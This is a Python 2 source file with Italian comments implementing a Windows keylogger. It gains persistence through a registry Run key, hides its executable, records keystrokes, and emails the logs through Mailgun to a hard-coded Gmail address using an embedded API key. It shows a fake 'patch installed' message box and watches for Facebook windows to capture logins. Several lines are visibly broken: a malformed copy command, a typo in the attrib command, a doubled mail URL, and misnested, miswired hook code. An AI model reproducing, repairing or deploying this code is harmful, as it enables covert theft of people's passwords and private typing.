import pyHook
import os
import sys
import win32gui
import pythoncom
import time
import subprocess
import ctypes
import requests

logs = str()

# variabile globale che mantiene i caratteri digitati
HOMEPATH = os.getenv('HOMEPATH')

# percorso home dell'utente ove verra' salvato il file di testo
executable_name = os.path.split(sys.argv[0])[1]

# Persistenza....faremo in modo che l'eseguibile si avii ad ogni avvio di win

subprocess.call("copyexecutable_name +  %userprofile%\\", shell=True)

# copiamo nel percorso home l'eseguibile
subprocess.call(
    "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f /v Keylog /d %userprofile%\\" + executable_name,
    shell=True)

# aggiungiamo l'esecuzione automatica nel registro di sistema (Valore: Keylog)
subprocess.call("attribr +h %userprofile%\\" + executable_name, shell=True)

# EMAIL HANDLING#
# possiamo usare mailgun https://documentation.mailgun.com/quickstart.html
MAILGUN_API_KEY = "key-ea7e18d428c40dd3f80cd07090a22969"
MAILGUN_DOMAIN_NAME = "https://api.mailgun.net/v3/sandboxb4b9b83c29084de8987b2ba088d863f6.mailgun.org"
RECIPIENT_EMAIL = "chris99ls.cl@gmail.com"  # email che ricevera' file da keylogger


def send_simple_message(data):
    a = requests.post("https://api.mailgun.net/v3/" + MAILGUN_DOMAIN_NAME + "mailgun.org/messages",
                      auth=("api", MAILGUN_API_KEY),
                      data={"from": "Excited User <mailgun@" + MAILGUN_DOMAIN_NAME + "mailgun.org>",
                            "to": "Master <" + RECIPIENT_EMAIL + ">",
                            "subject": "report keylog from:" + HOMEPATH,
                            "text": str(data)})

    os.remove(HOMEPATH + "\logs.txt")
    return a


def OnKeyBoardEvent(event):
    # metodo di callback in seguito a pressione di tasto global logs

    g = open(HOMEPATH + "\logs.txt", "a")  # apertura file log in append mode
    if event.KeyID == 8:
        logs = "[BACKSP]"
    elif event.KeyID == 9:
        logs = "[TAB]"
    elif event.KeyID == 13:
        logs = "[ENTER]"
    elif event.KeyID == 37:
        logs = "[LEFT]"
    elif event.KeyID == 38:
        logs = "[UP]"
    elif event.KeyID == 39:
        logs = "[RIGHT]"
    elif event.KeyID == 40:
        logs = "[DOWN]"
    else:
        logs = chr(event.Ascii)

    g.write(logs)
    g.close()

    d = open(HOMEPATH + "\logs.txt", "r")
    data = d.read()
    d.close()
    if len(data) >= 500:
        try:
            s = send_simple_message(str(data))
            print "[+] Sending email..."
            print s

        except:
            print "[-] Error sending email"
            raise

    def k_main():

        # craezione file di testo
        if not os.path.exists(HOMEPATH + "\logs.txt"):
            f = open(HOMEPATH + "\logs.txt", "w")

            # il file viene creato nella cartella dell'utente e.g C:\Utenti\NomeUtente
            f.close()

        hm = pyHook.HookManager()  # creazione HookManager
        hm.KeyDown = OnKeyBoardEvent()  # attesa evento tastiera
        hm.HookKeyboard()  # settagio hook
        pythoncom.PumpMessages()  # attesa per eventi windows(messages)

        # falsa message box
        ctypes.windll.user32.MessageBoxW(0, u"patch succesfully installed!", u"Patch", 0)

        while True:
            # ciclo che attende la visualizzazione di una scheda obiettivo, es: facebook
            target = "facebook"  # possiamo cambiare a nostro piacimento
            w = win32gui
            w_name = w.GetWindowText(w.GetForegroundWindow())

            if target in w_name.lower():
                k_main()  # se invocato, ferma il ciclo while true e va in attesa di eventi tastiera

            time.sleep(5)
